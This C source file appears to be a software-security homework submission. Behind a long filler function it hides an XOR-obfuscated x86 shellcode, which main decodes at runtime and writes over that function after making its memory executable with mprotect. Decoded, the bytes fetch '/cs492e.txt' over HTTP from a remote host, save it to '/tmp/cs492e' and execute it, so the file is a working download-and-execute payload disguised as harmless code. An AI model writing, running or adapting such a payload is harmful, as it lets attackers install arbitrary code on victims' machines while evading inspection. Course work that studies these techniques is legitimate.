/// CS492e homework.
// 20226189 - KAU Anthony Mathieu

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>

void dummy(void) {

    int i=0;
    i++;
    printf("%d: you should put enough dummy code here\n", i);
    i++;
    printf("%d: in order to safely overwrite it with your own\n", i);

    for(int iterator = 0; iterator <= 500; iterator++){
        printf("We are in the iteration : %d of the for loop \n", iterator);

        if (iterator == 4){
            printf("That's not a lucky number in china\n");
        }
        else if (iterator == 13){
            printf("Hope it is not a friday\n");
        }

        else if (iterator == 42){
            printf("Is this number the answer to everything ?\n");
        }
        else if (iterator == 50){
            printf("1/10 of the loop has been done already\n");
        }
        else if (iterator == 66){
            printf("Famous road in the united States\n");
        }
        else if (iterator == 77){
            printf("Let's make an insertion sort in ascending order\n");
            int array1[] = {4, 13, 99, 50, 10, -10, 777, 100, 1, 492, 42};
            int size1 = sizeof(array1) / sizeof(array1[0]);

            int iter, temp, j;
            for (iter = 1; iter < size1; iter++){
                temp = array1[iter];
                j = iter - 1;

                while (j >= 0 && array1[j] > temp){
                    array1[j + 1] = array1[j];
                    j = j - 1;
                }
                array1[j+1] = temp;
            }

            for (iter = 0; iter < size1; iter++){
                printf("%d ", array1[iter]);
            }
            printf("\n");
        }
        else if (iterator == 100){
            printf("2/10 of the loop has been done already\n");
        }

        else if (iterator == 125){
            printf("What is this ?\n");

            int n = iterator;
            while(n > 1){
                if(n % 2 == 0){
                    n = n / 2;
                    printf("%d\n", n);
                }
                else{
                    n = n * 3 + 1;
                    printf("%d\n", n);
                }
            }
        }
        else if (iterator == 150){
            printf("3/10 of the loop has been done\n");

        }
        else if (iterator == 177){
            printf("Time for bubble sort\n");
            int array2[] = {54, 52, 12, 64, 754, 231, 342, 6432, 10, 1231};
            int size2 = sizeof(array2) / sizeof(array2[0]);

            for (int step = 0; step < size2 - 1; step++){
                for (int i = 0; i < size2 - step - 1; i++){
                    if (array2[i] > array2[i + 1]){
                        int temp2 = array2[i];
                        array2[i] = array2[i+1];
                        array2[i+1] = temp2;
                    }
                }

            }
            for (int i = 0; i < size2; ++i) {
                printf("%d  ", array2[i]);
            }
            printf("\n");
        }
        else if (iterator == 200){
            printf("4/10 of the loop has been done\n");

        }
        else if (iterator == 225){
            if (iterator >= 10){
                printf("What is the point of this condition ?");
            }

        }
        else if (iterator == 250){
            printf("halfway done done\n");
        }
        else if (iterator == 277){
            printf("Let's calculate some factorial\n");
            unsigned long long fact = 1;
            int n = 5;
            for (i = 1; i <= n; i++){
                fact *= i;
            }
            printf("Factorial of %d = %llu\n", n, fact);
        }
        else if (iterator == 300){
            printf("6/10 of the loop has been done\n");

        }
        else if (iterator == 333){
            printf("Let's calculate the area of a square\n");
            float side, area;
            side = 10;
            area = side * side;
            printf("Area of square of side %f is %0.04f\n ", side, area);

        }
        else if (iterator == 350){
            printf("7/10 of the loop has been done\n");

        }
        else if (iterator == 333){
            printf("Let's calculate the sum of the Natural numbers for this iter\n");
            int sum;
            for (i = 1; i <= iterator; i++){
                sum += i;
            }
            printf("Sum of the naturals numbers to %d is %d", iterator, sum);
        }
        else if (iterator == 400){
            printf("8/10 of the loop has been done\n");

        }
        else if (iterator == 444){
            printf("After the square, here comes the rectangle\n");
            float length, width, area2;
            length = 10;
            width = 15;
            area2 = length * width;
            printf("Area of rectangle of length = %f and width = %f is %f\n", length, width, area2);
        }
        else if (iterator == 450){
            printf("9/10 of the loop has been done\n");

        }
        else if (iterator == 492){
            printf("Softsec is really hard !\n");

        }
        else if (iterator == 500){
            printf("Wow looks like we are done\n");

        }

    }
}

int make_writable(void *addr) {
    int page_size = getpagesize();
    addr -= (unsigned long)addr % page_size;

    if(mprotect(addr, page_size, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
        return -1;
    }

    return 0;
}

int main(void) {
    void *dummy_addr = (void*)dummy;

    if(make_writable(dummy_addr) == -1) {
        fprintf(stderr, "Failed to change perm.\n");
        return 1;
    }

    /*
    For version 2, I used a random bytes generator online to match the length of my shellcode
    Then I used another file to xor my shellcode with the randombytes, the result of this is
    in the xored array, and so we have randombytes ^ xored = shellcode.
    */
    unsigned char key[] =
        "\x01";

        //int length2 = sizeof(randombytes)-1;
        //printf("size of randombytes is %d \n", length2);

        unsigned char xored[] =
        "\x30\xC1\x30\xDA\x30\xC8\x30\xD3\xB1\x67\xB2\x00\x6B\x07\x6B\x00\x6B\x03\x88\xE0\xCC\x81\x88"
        "\xC6\xB9\x8E\xF9\x27\xD5\x53\x53\x51\x67\x69\x01\x51\x67\x6B\x03\x88\xE7\x30\xC1\x30\xDA\xB1"
        "\x67\xB2\x02\x6B\x11\x57\x56\x88\xE0\xCC\x81\x30\xC1\x30\xDA\x30\xC8\x30\xD3\xB1\x67\xB2\x08"
        "\x69\x0C\x0B\x0C\x0B\x69\x2E\x30\x2F\x31\x69\x49\x55\x55\x51\x69\x75\x79\x75\x21\x69\x38\x33"
        "\x64\x2F\x69\x2E\x62\x72\x35\x69\x46\x44\x55\x21\x88\xE7\x53\x6B\x1D\x57\x56\x88\xE0\xCC\x81"
        "\x30\xC1\x30\xDA\x30\xC8\x30\xD3\xB1\x02\x67\xBB\x26\x11\x88\xF0\x88\xFA\xCC\x81\x8A\x8F\xF6"
        "\x01\x01\x01\x30\xC1\x67\xB9\x31\x0B\x67\x38\xC9\x75\x40\x30\xC1\x30\xDA\x30\xC8\x30\xD3\xB1"
        "\x09\x53\x67\xB8\xFE\x00\x69\x35\x38\x33\x64\x69\x71\x2E\x62\x72\x69\x2E\x2E\x75\x6C\x88\xE2"
        "\xCC\x81\x30\xC8\xB1\x04\xB0\x03\x52\xCC\x81\x88\xC2\xB1\x05\x69\x62\x75\x64\x65\x69\x68\x6F"
        "\x67\x64\x88\xE0\xB3\x09\xCC\x81\xEA\x49\x30\xC1\x30\xDA\x30\xC8\x30\xD3\x51\x69\x35\x38\x33"
        "\x64\x69\x71\x2E\x62\x72\x69\x2E\x2E\x75\x6C\x88\xE2\x52\xB1\x04\xB0\x03\xCC\x81\x6B\x05\x8A"
        "\x15\x25\x38\xD1\x74\x1F\x30\xC1\x30\xDA\x30\xC8\x30\xD3\xB1\x0B\x50\x69\x35\x38\x33\x64\x69"
        "\x71\x2E\x62\x72\x69\x2E\x2E\x75\x6C\x88\xE2\xCC\x81\x30\xC1\xB1\x00\xB2\x00\xCC\x81";

        
        int length3 = sizeof(xored)-1;
        //printf("size of xored is %d \n", length3);

        unsigned char realcode[length3];

        for(int i = 0; i < length3; i++){
            realcode[i] = (char)(xored[i] ^ key[0]);
        }

    memcpy(dummy_addr, realcode, sizeof(realcode));

    dummy();
    return 0;
}